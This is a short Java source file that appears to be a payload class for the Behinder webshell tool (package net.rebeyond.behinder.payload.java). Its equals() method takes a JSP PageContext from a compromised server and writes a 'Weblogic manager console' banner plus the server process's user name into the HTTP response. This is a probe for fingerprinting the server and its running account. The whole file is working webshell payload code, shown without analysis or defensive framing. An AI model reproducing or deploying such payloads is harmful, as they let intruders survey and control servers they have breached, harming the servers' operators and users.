package net.rebeyond.behinder.payload.java;

import java.io.OutputStream;

import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;
public class Fcku{
	public Fcku() {}
	public boolean equals(Object obj) {
		if (obj instanceof PageContext) {
			try {
				PageContext G = (PageContext) obj;
				OutputStream out = ((HttpServletResponse) G.getResponse()).getOutputStream();
				String s = "Weblogic manager console " + System.getProperty("user.name");
				byte []a = s.getBytes();
				out.write(a);
				out.close();
			} catch (Exception e) {
			}
		}
		return true;
	}
}
